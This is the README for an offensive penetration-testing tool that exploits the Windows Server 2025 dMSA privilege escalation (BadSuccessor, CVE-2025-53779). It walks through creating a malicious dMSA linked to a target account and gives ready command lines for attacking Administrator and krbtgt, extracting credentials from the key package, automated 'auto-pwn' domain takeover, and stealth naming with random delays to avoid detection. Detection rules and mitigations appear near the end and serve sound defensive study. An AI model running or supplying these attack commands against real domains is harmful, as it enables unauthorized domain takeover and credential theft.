# BadSuccessor.py

A penetration testing tool that exploits the dMSA (delegated Managed Service Account) privilege escalation vulnerability in Windows Server 2025 Active Directory environments.

## ⚠️ Legal Disclaimer

**This tool is for authorized penetration testing and security research purposes only.** Use of this tool against systems without explicit written permission is illegal and unethical. The authors are not responsible for any misuse or damage caused by this tool.

## ⚠️ Development Status & Environmental Testing Disclaimer

**IMPORTANT: This tool is under active development and testing.**

### Current Status
- **Windows Server 2025 Adoption**: As of May 2025, Windows Server 2025 is still in early adoption phase with limited production deployments
- **Environmental Variations**: Due to the limited number of Windows Server 2025 environments available for testing, this tool may encounter untested configurations
- **Ongoing Development**: We are actively refining the tool as more environmental variations are deployed and tested

### What This Means
- **Expect Updates**: The tool will receive frequent updates as new environment types are tested
- **Report Issues**: Your feedback is crucial - please report any issues or edge cases you encounter
- **Test Carefully**: Always test in a non-production environment first
- **Schema Variations**: Different Windows Server 2025 builds may implement dMSA attributes differently
- **Feature Stability**: While core functionality is stable, some features may require adjustment for specific environments

### Known Variables Being Tracked
- Different Windows Server 2025 build versions
- Schema attribute naming conventions
- Regional/localized AD implementations
- Hybrid cloud configurations
- Various AD functional levels
- Different security hardening configurations

### Community Testing
We encourage the security community to:
- Test in diverse environments
- Share findings (sanitized)
- Submit pull requests for compatibility improvements
- Report environmental variations

**By using this tool, you acknowledge that it is under active development and may require modifications for your specific environment.**

## 📋 Overview

BadSuccessor exploits a privilege escalation vulnerability in Windows Server 2025's delegated Managed Service Account (dMSA) feature. The vulnerability allows attackers with minimal permissions to escalate privileges to any user in the domain, including Domain Administrators.

**Patch status:** Tracked as **CVE-2025-53779** (CVSS 7.2, relative path traversal in dMSA). Disclosed by Akamai on 2025-05-21 and fixed in Microsoft's **August 2025 Patch Tuesday**. Akamai notes the patch mitigates a significant part of the risk but the underlying technique stays relevant, so this tool remains useful against unpatched or misconfigured Windows Server 2025 environments.

### Research Credit

This tool is based on the excellent research by **Yuval Gordon** from **Akamai Technologies**:
- [BadSuccessor: Abusing dMSA to Escalate Privileges in Active Directory](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)

## 🎯 Vulnerability Details

The vulnerability exists in the dMSA migration process where:
1. An attacker creates a malicious dMSA in any writable OU
2. Sets `msDS-ManagedAccountPrecededByLink` or `ms-DS-Managed-Account-Preceded-By-Link` to point to a target user
3. Sets `msDS-DelegatedMSAState` or `ms-DS-Delegated-MSA-State` to `2` (migration completed)
4. The KDC automatically grants the dMSA all privileges of the target user via PAC inheritance

Additionally, the KERB-DMSA-KEY-PACKAGE structure contains the target user's password keys, enabling credential extraction.

## ✅ Prerequisites

### System Requirements
- Linux machine (non-domain joined)
- Python 3.8+ (developed and tested on 3.14)
- Network access to target Active Directory environment
- Target domain must have at least one Windows Server 2025 Domain Controller

### Python Dependencies
```bash
pip3 install ldap3 pyasn1 pycryptodome
pip3 install impacket==0.12.0
```

**Note**: The tool targets impacket 0.12.0 and also runs on newer releases (tested with 0.13.1). A version-mismatch warning is printed at runtime but can be ignored on supported newer versions.

### Optional Dependencies
```bash
# For DNS discovery
pip3 install dnspython

# For enhanced Kerberos support (system packages)
# Ubuntu/Debian
sudo apt-get install libkrb5-dev libgssapi-krb5-2

# RHEL/CentOS/Fedora
sudo yum install krb5-devel
```

### Required Permissions
- Valid domain credentials (any user account)
- **ANY** of the following permissions on at least one Organizational Unit:
  - `CreateChild` permission
  - `Write` permission
  - `GenericWrite` permission
  - `GenericAll` permission
  - Member of default groups with write access (e.g., Authenticated Users)
- Tool automatically discovers all writable OUs and shows specific permissions

## 🚀 Installation

```bash
git clone https://github.com/cybrly/badsuccessor.git
cd badsuccessor
pip3 install -r requirements.txt
chmod +x badsuccessor.py
```

### requirements.txt
```
ldap3>=2.9.1
pyasn1>=0.4.8
pycryptodome>=3.15.0
impacket==0.12.0
dnspython>=2.1.0
```

## 🧪 Testing

Unit tests cover the DACL/ACE parsing, the GUID helper, and session handling. They need no live Active Directory.

```bash
pip3 install impacket   # test dependency
python3 -m unittest discover -s tests
```

## 📖 Usage

### Basic Syntax
```bash
python3 badsuccessor.py -d <domain> -u <username> -p <password> [options]
```

### Quick Start Examples

#### 1. Dry Run Mode (NEW) - Test Without Making Changes
```bash
# Simulate attack to verify viability
python3 badsuccessor.py -d corp.local -u john -p Password123 --dry-run --target Administrator

# Dry run with specific OU
python3 badsuccessor.py -d corp.local -u john -p Password123 --dry-run --target Administrator --ou-dn "OU=ServiceAccounts,DC=corp,DC=local"
```

#### 2. Enumerate Environment
```bash
# Check Windows Server 2025 schema support
python3 badsuccessor.py -d corp.local -u john -p Password123 --check-schema

# Find ALL writable OUs with detailed permissions
python3 badsuccessor.py -d corp.local -u john -p Password123 --enumerate

# List high-value targets
python3 badsuccessor.py -d corp.local -u john -p Password123 --list-targets

# Validate specific target account
python3 badsuccessor.py -d corp.local -u john -p Password123 --validate-target Administrator
```

#### 3. Perform Attack
```bash
# Basic attack against Administrator
python3 badsuccessor.py -d corp.local -u john -p Password123 --attack --target Administrator

# Stealth mode with innocuous naming
python3 badsuccessor.py -d corp.local -u john -p Password123 --attack --target Administrator --stealth --random-delay 30

# Attack with custom dMSA attributes
python3 badsuccessor.py -d corp.local -u john -p Password123 --attack --target krbtgt \
  --dmsa-name legit_service --dmsa-description "Legitimate Service Account" \
  --dmsa-display-name "Production Service"

# Attack with custom naming pattern
python3 badsuccessor.py -d corp.local -u john -p Password123 --attack --target Administrator \
  --dmsa-pattern "svc{random}prod"
```

#### 4. Extract Credentials
```bash
# Extract credentials for multiple users
python3 badsuccessor.py -d corp.local -u john -p Password123 --extract-creds --targets Administrator,krbtgt,svc_sql

# Auto-pwn mode (fully automated)
python3 badsuccessor.py -d corp.local -u john -p Password123 --auto-pwn
```

#### 5. Session Management (NEW)
```bash
# List all sessions
python3 badsuccessor.py -d corp.local -u john -p Password123 --list-sessions

# Resume a previous session
python3 badsuccessor.py -d corp.local -u john -p Password123 --session-id corp_local_john_1234567890_abcd1234

# Clean up all dMSAs from a session
python3 badsuccessor.py -d corp.local -u john -p Password123 --cleanup-session SESSION_ID

# Clean up all dMSAs from current session
python3 badsuccessor.py -d corp.local -u john -p Password123 --cleanup-all
```

#### 6. Export Results (NEW)
```bash
# Export enumeration results to JSON
python3 badsuccessor.py -d corp.local -u john -p Password123 --enumerate --export-json results.json

# Export to CSV
python3 badsuccessor.py -d corp.local -u john -p Password123 --enumerate --export-csv writable_ous.csv

# Generate HTML report
python3 badsuccessor.py -d corp.local -u john -p Password123 --enumerate --export-html report.html

# Combined operation with exports
python3 badsuccessor.py -d corp.local -u john -p Password123 --attack --target Administrator \
  --export-json attack_results.json --export-html attack_report.html
```

### Command Line Options

#### Authentication Arguments
| Option | Description |
|--------|-------------|
| `-d, --domain` | Target domain (e.g., corp.local) **[REQUIRED]** |
| `-u, --username` | Username for authentication **[REQUIRED]** |
| `-p, --password` | Password for authentication |
| `--dc-ip` | Domain Controller IP (auto-discover if omitted) |
| `--ldaps` | Force LDAPS (SSL) connection on port 636 |

#### Attack Modes
| Option | Description |
|--------|-------------|
| `--attack` | Perform the BadSuccessor attack |
| `--dry-run` | **NEW**: Simulate attack without making changes |
| `--extract-creds` | Extract credentials using key package |
| `--auto-pwn` | Fully automated domain takeover |

#### Target Specification
| Option | Description |
|--------|-------------|
| `--target` | Target user to escalate privileges to |
| `--targets` | Comma-separated list of users for credential extraction |
| `--validate-target` | **NEW**: Validate a target account without attacking |

#### dMSA Configuration
| Option | Description |
|--------|-------------|
| `--dmsa-name` | Name for malicious dMSA (auto-generated if not specified) |
| `--dmsa-pattern` | **NEW**: Pattern for dMSA naming (e.g., "svc{random}{target}") |
| `--ou-dn` | Specific OU DN to use (auto-detect if not specified) |
| `--dmsa-description` | **NEW**: Description for created dMSA |
| `--dmsa-display-name` | **NEW**: Display name for created dMSA |

#### Enumeration Options
| Option | Description |
|--------|-------------|
| `--enumerate` | Enumerate OUs with ANY write permissions |
| `--list-targets` | List high-value targets |
| `--check-schema` | Verify Windows Server 2025 schema |

#### Session Management (NEW)
| Option | Description |
|--------|-------------|
| `--session-id` | Resume existing session |
| `--list-sessions` | List all available sessions |
| `--cleanup-session SESSION_ID` | Clean up all dMSAs from a session |

#### Cleanup Options
| Option | Description |
|--------|-------------|
| `--cleanup` | Remove created dMSA |
| `--dmsa-dn` | dMSA DN for cleanup operations |
| `--cleanup-all` | **NEW**: Clean up all dMSAs from current session |

#### Output Options
| Option | Description |
|--------|-------------|
| `--export-json FILE` | **NEW**: Export results to JSON file |
| `--export-csv FILE` | **NEW**: Export results to CSV file |
| `--export-html FILE` | **NEW**: Generate HTML report |
| `--no-banner` | Suppress banner output |
| `--verbose` | Enable verbose output |

#### Stealth Options (NEW)
| Option | Description |
|--------|-------------|
| `--stealth` | Enable stealth mode (innocuous naming) |
| `--random-delay SECONDS` | Random delay between operations (0-N seconds) |

## 🔧 Attack Workflow

### Phase 1: Reconnaissance
1. **Schema Verification**: Confirms Windows Server 2025 dMSA support with dynamic attribute detection
2. **Permission Discovery**: Identifies OUs with ANY write access (not just CreateChild)
3. **Target Validation**: **NEW** - Comprehensive target account analysis before attack

### Phase 2: Exploitation
1. **Dry Run Option**: **NEW** - Test attack viability without making changes
2. **dMSA Creation**: Creates malicious dMSA with customizable attributes
3. **Attribute Manipulation**: Sets predecessor link and migration state with schema awareness
4. **Session Tracking**: **NEW** - All created objects tracked for easy cleanup

### Phase 3: Authentication
1. **Kerberos TGT Request**: Obtains TGT with inherited privileges
2. **PAC Analysis**: Verifies inherited group memberships
3. **Key Package Extraction**: Enhanced parsing with multiple fallback methods

### Phase 4: Post-Exploitation
The tool provides ready-to-use commands for:
- DCSync attacks (dump all domain hashes)
- Remote command execution
- Lateral movement
- Persistence establishment

## 🔐 Key Features

### Dynamic Schema Detection (NEW)
- Automatically detects which attribute naming convention your environment uses
- Supports all known variations of dMSA attributes
- Fallback mechanisms for different Windows Server 2025 builds

### Enhanced Target Validation (NEW)
- Pre-attack validation of target accounts
- Detects disabled, locked, or expired accounts
- Warns about smartcard requirements and delegation restrictions
- Provides recommendations based on target properties

### Session Management (NEW)
- Persistent session tracking across operations
- Resume interrupted attacks
- Bulk cleanup of all created dMSAs
- Session files stored as JSON (not pickle) in a per-user state directory (`$XDG_STATE_HOME/badsuccessor/sessions`, default `~/.local/state/badsuccessor/sessions`), written `0600`, with session ids sanitized against path traversal

### Dry Run Mode (NEW)
- Test attack viability without making any changes
- Validates schema, permissions, and target
- Reports exactly what would happen during a real attack
- Perfect for reconnaissance and planning

### Stealth Features (NEW)
- Innocuous dMSA naming patterns that blend in
- Random delays between operations
- Customizable dMSA attributes (description, display name)
- Pattern-based naming with variables

### Professional Output Formats (NEW)
- JSON export for integration with other tools
- CSV export for spreadsheet analysis
- HTML reports with styled output
- Structured data for all operations

### Enterprise-Grade Error Handling
- Comprehensive error messages with actionable solutions
- Graceful fallbacks for all operations
- Detailed logging with timestamp and severity
- Verbose mode for troubleshooting

### Complete Implementation
- Modular design with specialized classes
- Works across varied AD configurations via dynamic schema detection
- Note: the S4U2Self fallback in `KerberosAuthenticator` is a stub and not yet implemented

## 🛡️ Detection

### Event IDs to Monitor
| Event ID | Source | Description |
|----------|--------|-------------|
| **5137** | Security | Directory service object creation (dMSA) |
| **5136** | Security | Directory service object modification |
| **2946** | Directory Service | Group Managed Service Account authentication |
| **4768** | Security | Kerberos TGT requested |
| **4769** | Security | Kerberos service ticket requested |

### Detection Rules
```
# Splunk Query Example
index=windows EventCode=5137
| where ObjectClass="msDS-DelegatedManagedServiceAccount" OR ObjectClass="ms-DS-Delegated-Managed-Service-Account"
| where NOT user IN ("approved_admins")

# Sigma Rule Example
detection:
  selection:
    EventID: 5136
    AttributeLDAPDisplayName:
      - 'msDS-ManagedAccountPrecededByLink'
      - 'ms-DS-Managed-Account-Preceded-By-Link'
  condition: selection
```

### Behavioral Indicators
- Rapid creation and deletion of service accounts
- Non-administrative users creating dMSAs
- Unusual modifications to migration-related attributes
- Service accounts authenticating from unexpected sources
- dMSAs with suspicious naming patterns

## 🔒 Mitigation

### Immediate Actions
1. **Restrict OU Permissions**
   ```powershell
   # Remove ALL write permissions from non-admin users
   Remove-ADPermission -Identity "OU=ServiceAccounts,DC=corp,DC=local" -User "Domain Users" -AccessRights CreateChild,Write,GenericWrite,GenericAll

   # Check for default group permissions
   Get-ADPermission -Identity "OU=ServiceAccounts,DC=corp,DC=local" | Where-Object {$_.IdentityReference -match "Authenticated Users|Everyone"}
   ```

2. **Monitor dMSA Operations**
   ```powershell
   # Enable auditing on dMSA attributes (both naming conventions)
   Set-ADObject -Identity "CN=Schema,CN=Configuration,DC=corp,DC=local" -Add @{
     'msDS-ReplAttributeMetaData' = @('msDS-ManagedAccountPrecededByLink', 'ms-DS-Managed-Account-Preceded-By-Link')
   }
   ```

3. **Implement Detection**
   - Deploy provided detection rules
   - Alert on Event ID 2946 with S-1-5-7 caller
   - Monitor attribute modifications
   - Track dMSA creation patterns

### Long-term Solutions
- Apply the Microsoft patch for CVE-2025-53779 (August 2025 Patch Tuesday); follow Microsoft's manual steps to create a dedicated service principal for the hybrid connection
- Regular permission audits (check ALL write permissions, not just CreateChild)
- Principle of least privilege enforcement
- Consider disabling dMSA if not required
- Implement approval workflow for service account creation

## 📊 Statistics

Based on Akamai's research:
- **91%** of environments have vulnerable permissions
- Works on **default configurations**
- Affects organizations with Windows Server 2025 DCs
- Patched by Microsoft in August 2025 (CVE-2025-53779); still relevant against unpatched/misconfigured environments

## 🏗️ Technical Implementation Details

### dMSA Object Structure
```ldif
dn: CN=evil_dmsa,OU=ServiceAccounts,DC=corp,DC=local
objectClass: top
objectClass: msDS-GroupManagedServiceAccount
objectClass: msDS-DelegatedManagedServiceAccount
sAMAccountName: evil_dmsa$
userAccountControl: 4096
# Note: Your environment may use either format below
msDS-ManagedAccountPrecededByLink: CN=Administrator,CN=Users,DC=corp,DC=local
# OR
ms-DS-Managed-Account-Preceded-By-Link: CN=Administrator,CN=Users,DC=corp,DC=local
msDS-DelegatedMSAState: 2
msDS-SupportedEncryptionTypes: 28
```

### Key Package Structure
The KERB-DMSA-KEY-PACKAGE contains:
- Current keys: dMSA's encryption keys
- Previous keys: Target user's encryption keys (including NTLM hash)
- Enables direct credential extraction without password cracking

## 🤝 Contributing

Contributions are welcome! Please:
1. Fork the repository
2. Create a feature branch (`git checkout -b feature/enhancement`)
3. Commit changes (`git commit -m 'Add new feature'`)
4. Push to branch (`git push origin feature/enhancement`)
5. Submit a Pull Request

### Development Guidelines
- Follow PEP 8 style guide
- Add unit tests for new features
- Update documentation
- Test against multiple AD environments
- Test with different schema attribute naming conventions
- Ensure all features are production-ready (no placeholders)

## 📝 Changelog

### Unreleased - Correctness & safety fixes
- **FIXED**: OU permission scan now detects `ACCESS_ALLOWED_OBJECT_ACE` (object ACEs), including `CreateChild` scoped to the dMSA class — the exact BadSuccessor primitive, which was previously missed entirely.
- **FIXED**: dMSA schema GUID (was the gMSA GUID); now read from the live schema `schemaIDGUID` with a correct constant fallback.
- **FIXED**: replaced the removed `ldaptypes.bin_to_string` call that silently broke DACL parsing on impacket 0.12+.
- **FIXED**: malformed service-account LDAP filter (spaces after `&`) that AD rejected.
- **FIXED**: `pkg_resources` (removed on Python 3.12+) replaced with `importlib.metadata`.
- **SECURITY**: session state is JSON, not pickle; stored per-user in `~/.local/state/badsuccessor/sessions` at `0600`, with path-traversal-safe session ids.
- **NEW**: unit tests under `tests/`.

### v2.3.0 (2025-05-28) - Feature Release
- **NEW**: Dry run mode for safe attack simulation
- **NEW**: Comprehensive session management with state persistence
- **NEW**: Target account validation with detailed analysis
- **NEW**: Export capabilities (JSON, CSV, HTML)
- **NEW**: Stealth mode with innocuous naming patterns
- **NEW**: Customizable dMSA attributes (description, display name)
- **NEW**: Pattern-based dMSA naming with variables
- **NEW**: Random delay support for stealth operations
- **NEW**: Dynamic schema attribute detection
- **NEW**: Enhanced key package parsing with fallbacks
- **NEW**: Bulk cleanup operations
- **NEW**: Professional error handling and logging
- **IMPROVED**: Complete modular architecture
- **IMPROVED**: Version checking for dependencies

### v2.2.0 (2025-05-27) - Compatibility Update
- **FIXED**: Resolved impacket import issues (removed seq_decode dependency)
- **FIXED**: Compatible with impacket 0.12.0
- **FEATURE**: Added support for both dMSA attribute naming conventions
- **IMPROVED**: Better error handling for import failures
- **IMPROVED**: More robust schema detection

### v2.1.0 (2025-05-25) - Complete Implementation
- **MAJOR**: Enhanced ACL permission checking - now detects ALL write permissions
- **MAJOR**: Added support for default groups (Authenticated Users, Everyone, etc.)
- **FIXED**: Removed all placeholder code
- **FIXED**: Complete implementation of all features
- **IMPROVED**: Better error handling and informative output
- **IMPROVED**: More comprehensive OU enumeration (includes containers)
- **FEATURE**: Shows exact permissions for each discovered OU
- **FEATURE**: Detects protected users and delegation restrictions

### v2.0.0 (2025-05-24) - Enhanced Edition
- **Major**: Full Kerberos authentication implementation
- **Major**: KERB-DMSA-KEY-PACKAGE extraction for credential theft
- **Major**: Basic ACL permission checking
- **Major**: Windows Server 2025 schema verification
- **Feature**: Mass credential extraction mode
- **Feature**: Auto-pwn for automated domain takeover
- **Feature**: Enhanced target enumeration
- **Feature**: Post-exploitation command generation
- **Improvement**: Better error handling and logging
- **Improvement**: Production-ready code structure

## 📚 References

- [Original Akamai Research](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [CVE-2025-53779 (MSRC)](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)
- [GitHub Issue #1 - Enhanced Permission Checking](https://github.com/cybrly/badsuccessor/issues/1)
- [GitHub Issue #2 - Schema Attribute Naming](https://github.com/cybrly/badsuccessor/issues/2)
- [Microsoft Security Response Center](https://msrc.microsoft.com/)

## 🐛 Known Issues

- Some environments may use different attribute naming conventions (handled by dynamic detection)
- Hash authentication requires password for initial implementation
- Some environments may require manual Kerberos configuration
- Detection rules need customization per environment

## 🔍 Troubleshooting

### Import Errors
If you encounter import errors with impacket:
```bash
# Ensure you have the correct version
pip3 uninstall impacket
pip3 install impacket==0.12.0

# Check version
python3 -c "import impacket; print(impacket.__version__)"
```

### Schema Detection Failures
The tool now includes dynamic schema detection. If it still fails:
```powershell
# On Domain Controller - Check actual attribute names
Get-ADObject -Filter {name -like "*delegated*" -or name -like "*preceded*"} -SearchBase "CN=Schema,CN=Configuration,DC=corp,DC=local" | Select Name
```

### Permission Denied Errors
Use the new dry-run mode to test:
```bash
# Test without making changes
python3 badsuccessor.py -d corp.local -u john -p Password123 --dry-run --target Administrator

# Check your exact permissions
python3 badsuccessor.py -d corp.local -u john -p Password123 --enumerate --verbose
```

### Session Issues
```bash
# List sessions
python3 badsuccessor.py -d corp.local -u john -p Password123 --list-sessions

# Clean up stale sessions (per-user state dir)
rm -rf ~/.local/state/badsuccessor/sessions/
```

## 📧 Contact

For questions, issues, or responsible disclosure:
- Open a GitHub Issue
- Follow responsible disclosure practices
- Allow 90 days for patch development

---

**⚡ Remember: With great power comes great responsibility. Always obtain proper authorization before testing!** 🔐
